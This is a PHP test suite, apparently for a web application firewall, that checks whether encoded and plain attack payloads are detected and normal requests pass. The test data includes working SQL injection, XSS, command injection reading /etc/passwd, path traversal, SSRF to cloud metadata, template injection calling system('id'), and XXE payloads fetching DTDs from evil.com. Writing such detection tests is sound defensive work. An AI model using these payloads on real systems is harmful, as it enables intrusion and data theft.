<?php
/**
 * 极限测试套件 - 验证14层归一化 + 语义融合 + 内容类型路由
 * 
 * 测试覆盖：
 *   A. 编码绕过（14层归一化验证）
 *   B. SQL注入（10种变种）
 *   C. XSS（10种变种）
 *   D. 命令注入（5种变种）
 *   E. 路径遍历（5种变种）
 *   F. XXE（3种变种）
 *   G. SSRF（3种变种）
 *   H. SSTI（3种变种）
 *   I. 模板注入（3种变种）
 *   J. CRLF注入（3种变种）
 *   K. 反序列化（3种变种）
 *   L. OpenRedirect（3种变种）
 *   M. 误报测试（正常请求不应拦截）
 *   N. 内容类型路由验证
 */

define('ABSPATH', true);
define('WAF_MAGIC_KEY', 'test_magic_key_for_testing_only_32chars');
date_default_timezone_set('UTC');

// 加载所有依赖
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../src/Core/Normalizer.php';
require_once __DIR__ . '/../src/Semantic/AdversarialDefense.php';
require_once __DIR__ . '/../src/Semantic/SemanticEngine.php';

// 模拟 waf_get_real_ip
if (!function_exists('waf_get_real_ip')) {
    function waf_get_real_ip() { return '127.0.0.1'; }
}
if (!function_exists('waf_block')) {
    function waf_block($reason) { 
        throw new \Exception("BLOCKED: " . $reason);
    }
}

class ExtremeTest {
    private $passCount = 0;
    private $failCount = 0;
    private $skipCount = 0;
    private $failures = [];
    
    public function run() {
        echo "========================================\n";
        echo " Shield WAF 极限测试套件\n";
        echo "========================================\n\n";
        
        $this->testA_EncodingBypass();
        $this->testB_SqlInjection();
        $this->testC_Xss();
        $this->testD_CommandInjection();
        $this->testE_PathTraversal();
        $this->testF_Xxe();
        $this->testG_Ssrf();
        $this->testH_Ssti();
        $this->testI_TemplateInjection();
        $this->testJ_Crlf();
        $this->testK_Deserialization();
        $this->testL_OpenRedirect();
        $this->testM_FalsePositive();
        $this->testN_ContentTypeRouting();
        
        echo "\n========================================\n";
        echo " 测试结果汇总\n";
        echo "========================================\n";
        echo "通过: {$this->passCount}\n";
        echo "失败: {$this->failCount}\n";
        echo "跳过: {$this->skipCount}\n";
        echo "总计: " . ($this->passCount + $this->failCount + $this->skipCount) . "\n";
        
        if (!empty($this->failures)) {
            echo "\n--- 失败用例详情 ---\n";
            foreach ($this->failures as $i => $f) {
                echo ($i+1) . ". [{$f['category']}] {$f['name']}\n";
                echo "   payload: " . substr($f['payload'], 0, 100) . (strlen($f['payload']) > 100 ? '...' : '') . "\n";
                echo "   原因: {$f['reason']}\n";
            }
        }
        
        return $this->failCount === 0 ? 0 : 1;
    }
    
    /**
     * 检测攻击是否被识别（任一检测层命中即算通过）
     */
    private function detectAttack(string $payload, string $uri = '/search', string $contentType = ''): array {
        // 通过 WafNormalizer 归一化
        $normResult = WafNormalizer::normalizeWithContext($payload);
        $normalized = $normResult['output'];
        
        // 通过 SemanticEngine 深度分析
        $params = ['q' => $payload];
        $body = $payload;
        
        try {
            $semResult = SemanticEngine::analyze(
                $normalized,
                $uri,
                $params,
                $normResult,
                '127.0.0.1',
                [],
                [],
                'GET',
                $body,
                $contentType
            );
        } catch (\Throwable $e) {
            $semResult = ['total_score' => 100, 'error' => $e->getMessage()];
        }
        
        return [
            'score' => $semResult['total_score'] ?? 0,
            'normalized' => $normalized,
            'sem_result' => $semResult,
        ];
    }
    
    /**
     * 断言攻击被检测到（分数 >= 阈值）
     */
    private function assertAttackDetected(string $category, string $name, string $payload, $arg4 = 50, $arg5 = '') {
        // 兼容两种调用：assertAttackDetected(cat, name, payload, threshold) 或 assertAttackDetected(cat, name, payload, uri, contentType)
        if (is_string($arg4)) {
            $uri = $arg4;
            $contentType = $arg5;
            $threshold = 50;
        } else {
            $uri = '/search';
            $contentType = '';
            $threshold = (int)$arg4;
        }
        
        $result = $this->detectAttack($payload, $uri, $contentType);
        if ($result['score'] >= $threshold) {
            echo "[PASS] {$category}: {$name} (score={$result['score']})\n";
            $this->passCount++;
        } else {
            echo "[FAIL] {$category}: {$name} (score={$result['score']}, 期望>={$threshold})\n";
            $this->failCount++;
            $this->failures[] = [
                'category' => $category,
                'name' => $name,
                'payload' => $payload,
                'reason' => "score={$result['score']}, 期望>={$threshold}",
            ];
        }
    }
    
    /**
     * 断言正常请求不被误报（分数 < 50）
     */
    private function assertNotFalsePositive(string $category, string $name, string $payload, int $threshold = 50) {
        $result = $this->detectAttack($payload);
        if ($result['score'] < $threshold) {
            echo "[PASS] {$category}: {$name} (score={$result['score']})\n";
            $this->passCount++;
        } else {
            echo "[FAIL] {$category}: {$name} (score={$result['score']}, 期望<{$threshold}) - 误报!\n";
            $this->failCount++;
            $this->failures[] = [
                'category' => $category,
                'name' => $name,
                'payload' => $payload,
                'reason' => "score={$result['score']}, 期望<{$threshold} (误报)",
            ];
        }
    }
    
    // ============== A. 编码绕过 ==============
    private function testA_EncodingBypass() {
        echo "\n--- A. 14层编码归一化绕过测试 ---\n";
        
        // 双重URL编码
        $this->assertAttackDetected('A编码绕过', '双重URL编码SQL注入',
            '%2527%2520OR%25201%253D1--');
        
        // HTML实体编码
        $this->assertAttackDetected('A编码绕过', 'HTML实体编码XSS',
            '&#60;script&#62;alert(1)&#60;/script&#62;');
        
        // Unicode实体编码
        $this->assertAttackDetected('A编码绕过', 'Unicode实体编码XSS',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e');
        
        // Hex编码
        $this->assertAttackDetected('A编码绕过', 'Hex编码SQL注入',
            '0x27204f5220313d312d2d');
        
        // 混合编码
        $this->assertAttackDetected('A编码绕过', '混合编码XSS',
            '%3Cscript%3Ealert%281%29%3C%2Fscript%3E');
        
        // Base64编码
        $this->assertAttackDetected('A编码绕过', 'Base64编码命令',
            'c3lzdGVtKCdpZCcp');
        
        // 八进制编码
        $this->assertAttackDetected('A编码绕过', '八进制编码命令',
            '\\163\\171\\163\\164\\145\\155\\50\\47\\151\\144\\47\\51');
    }
    
    // ============== B. SQL注入 ==============
    private function testB_SqlInjection() {
        echo "\n--- B. SQL注入测试 ---\n";
        
        $payloads = [
            'UNION注入' => "1' UNION SELECT username, password FROM users--",
            '布尔盲注' => "1' AND 1=1--",
            '时间盲注' => "1'; WAITFOR DELAY '0:0:5'--",
            '报错注入' => "1' AND extractvalue(1, concat(0x7e, (SELECT version())))--",
            '堆叠注入' => "1'; DROP TABLE users--",
            '内联注释' => "1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
            'Hex编码SQL' => "1' UNION SELECT 0x61646d696e--",
            'Char函数' => "1' OR 1=1 UNION SELECT char(97,100,109,105,110)--",
            'InformationSchema' => "1' UNION SELECT table_name FROM information_schema.tables--",
            'SQL注释绕过' => "1'/**/UNION/**/SELECT/**/1,2,3--",
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('B-SQL注入', $name, $payload);
        }
    }
    
    // ============== C. XSS ==============
    private function testC_Xss() {
        echo "\n--- C. XSS测试 ---\n";
        
        $payloads = [
            '基本script标签' => '<script>alert(1)</script>',
            '事件处理器' => '<img src=x onerror=alert(1)>',
            'javascript协议' => '<a href="javascript:alert(1)">click</a>',
            'SVG onload' => '<svg onload=alert(1)>',
            'iframe srcdoc' => '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
            'body onload' => '<body onload=alert(1)>',
            'SVG script' => '<svg><script>alert(1)</script></svg>',
            '数据URI' => '<object data="data:text/html,<script>alert(1)</script>">',
            'Unicode转义XSS' => '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
            'String.fromCharCode' => '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('C-XSS', $name, $payload);
        }
    }
    
    // ============== D. 命令注入 ==============
    private function testD_CommandInjection() {
        echo "\n--- D. 命令注入测试 ---\n";
        
        $payloads = [
            '基本命令注入' => '; cat /etc/passwd',
            '管道命令注入' => '| id',
            '反引号注入' => '`id`',
            '$()注入' => '$(whoami)',
            'AND命令注入' => '&& ls -la',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('D-命令注入', $name, $payload);
        }
    }
    
    // ============== E. 路径遍历 ==============
    private function testE_PathTraversal() {
        echo "\n--- E. 路径遍历测试 ---\n";
        
        $payloads = [
            '基本路径遍历' => '../../../etc/passwd',
            'URL编码路径遍历' => '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '双重URL编码' => '%252e%252e%252fetc%252fpasswd',
            'UTF-8超长编码' => '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
            'Null字节截断' => '../../../etc/passwd%00.jpg',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('E-路径遍历', $name, $payload);
        }
    }
    
    // ============== F. XXE ==============
    private function testF_Xxe() {
        echo "\n--- F. XXE测试 ---\n";
        
        $payloads = [
            '基本XXE' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'Blind XXE' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
            '参数实体XXE' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]>',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('F-XXE', $name, $payload, '/xml', 'application/xml');
        }
    }
    
    // ============== G. SSRF ==============
    private function testG_Ssrf() {
        echo "\n--- G. SSRF测试 ---\n";
        
        $payloads = [
            '内网IP' => 'http://127.0.0.1/admin',
            '云元数据' => 'http://169.254.169.254/latest/meta-data/',
            '本地文件协议' => 'file:///etc/passwd',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('G-SSRF', $name, $payload, '/fetch', '');
        }
    }
    
    // ============== H. SSTI ==============
    private function testH_Ssti() {
        echo "\n--- H. SSTI测试 ---\n";
        
        $payloads = [
            'Jinja2 SSTI' => '{{7*7}}',
            'Twig SSTI' => '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            'Freemarker SSTI' => '${7*7}',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('H-SSTI', $name, $payload);
        }
    }
    
    // ============== I. 模板注入 ==============
    private function testI_TemplateInjection() {
        echo "\n--- I. 模板注入测试 ---\n";
        
        $payloads = [
            'Smarty注入' => '{system(\'id\')}',
            'PHP模板注入' => '<?=system(\'id\')?>',
            'ASP模板注入' => '<%=Execute("id")%>',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('I-模板注入', $name, $payload);
        }
    }
    
    // ============== J. CRLF ==============
    private function testJ_Crlf() {
        echo "\n--- J. CRLF注入测试 ---\n";
        
        $payloads = [
            '基本CRLF' => "test\r\nSet-Cookie: evil=1",
            'URL编码CRLF' => "test%0d%0aSet-Cookie:%20evil=1",
            '响应拆分' => "test%0d%0a%0d%0a<html><script>alert(1)</script></html>",
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('J-CRLF', $name, $payload);
        }
    }
    
    // ============== K. 反序列化 ==============
    private function testK_Deserialization() {
        echo "\n--- K. 反序列化测试 ---\n";
        
        $payloads = [
            'PHP反序列化' => 'O:4:"User":1:{s:4:"name";s:4:"test";}',
            'PHP危险类反序列化' => 'O:15:"PHP_Object_Injection":1:{s:6:"inject";s:10:"phpinfo();";}',
            '大对象反序列化' => 'a:2:{i:0;s:4:"test";i:1;O:8:"DateTime":0:{}}',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('K-反序列化', $name, $payload, '/api', 'application/json');
        }
    }
    
    // ============== L. OpenRedirect ==============
    private function testL_OpenRedirect() {
        echo "\n--- L. OpenRedirect测试 ---\n";
        
        $payloads = [
            '协议跳转' => 'redirect=https://evil.com',
            '双斜杠跳转' => 'redirect=//evil.com',
            '@符号跳转' => 'redirect=https://google.com@evil.com',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertAttackDetected('L-OpenRedirect', $name, $payload, '/login', '');
        }
    }
    
    // ============== M. 误报测试 ==============
    private function testM_FalsePositive() {
        echo "\n--- M. 误报测试（正常请求不应拦截） ---\n";
        
        $payloads = [
            '正常搜索' => 'hello world',
            '中文内容' => '今天天气真好',
            '代码示例' => 'function add(a, b) { return a + b; }',
            '数学公式' => 'x = 1 + 2 * 3 / 4',
            'URL参数' => 'page=1&size=10&sort=asc',
            'JSON数据' => '{"name":"张三","age":25,"city":"北京"}',
            'HTML内容' => '<p>这是一段正常的文章内容</p>',
            '技术文档' => 'SELECT * FROM documentation WHERE category = "guide"',
            '密码字段' => 'P@ssw0rd123!',
            '邮件内容' => 'user@example.com (联系管理员)',
        ];
        
        foreach ($payloads as $name => $payload) {
            $this->assertNotFalsePositive('M-误报', $name, $payload, 50);
        }
    }
    
    // ============== N. 内容类型路由验证 ==============
    private function testN_ContentTypeRouting() {
        echo "\n--- N. 内容类型路由验证 ---\n";
        
        // JSON请求 - XXE解析器不应被激活
        $jsonPayload = '{"query":"1 UNION SELECT 1"}';
        $result1 = $this->detectAttack($jsonPayload, '/api', 'application/json');
        $sem1 = $result1['sem_result'] ?? [];
        // JSON请求中SQL注入应该被检测到（SQL解析器激活）
        if (($result1['score'] ?? 0) >= 50) {
            echo "[PASS] N-路由: JSON请求中SQL注入被检测 (score={$result1['score']})\n";
            $this->passCount++;
        } else {
            echo "[FAIL] N-路由: JSON请求中SQL注入漏检 (score={$result1['score']})\n";
            $this->failCount++;
            $this->failures[] = [
                'category' => 'N-路由',
                'name' => 'JSON请求SQL注入',
                'payload' => $jsonPayload,
                'reason' => "score={$result1['score']}, SQL解析器应该检测到",
            ];
        }
        
        // XML请求 - XXE解析器应该被激活
        $xmlPayload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
        $result2 = $this->detectAttack($xmlPayload, '/api', 'application/xml');
        if (($result2['score'] ?? 0) >= 50) {
            echo "[PASS] N-路由: XML请求中XXE被检测 (score={$result2['score']})\n";
            $this->passCount++;
        } else {
            echo "[FAIL] N-路由: XML请求中XXE漏检 (score={$result2['score']})\n";
            $this->failCount++;
            $this->failures[] = [
                'category' => 'N-路由',
                'name' => 'XML请求XXE',
                'payload' => $xmlPayload,
                'reason' => "score={$result2['score']}, XXE解析器应该被激活",
            ];
        }
        
        // HTML请求 - HTML解析器应该被激活
        $htmlPayload = '<script>alert(1)</script>';
        $result3 = $this->detectAttack($htmlPayload, '/comment', 'text/html');
        if (($result3['score'] ?? 0) >= 50) {
            echo "[PASS] N-路由: HTML请求中XSS被检测 (score={$result3['score']})\n";
            $this->passCount++;
        } else {
            echo "[FAIL] N-路由: HTML请求中XSS漏检 (score={$result3['score']})\n";
            $this->failCount++;
            $this->failures[] = [
                'category' => 'N-路由',
                'name' => 'HTML请求XSS',
                'payload' => $htmlPayload,
                'reason' => "score={$result3['score']}, HTML解析器应该被激活",
            ];
        }
    }
}

// 运行测试
$test = new ExtremeTest();
exit($test->run());
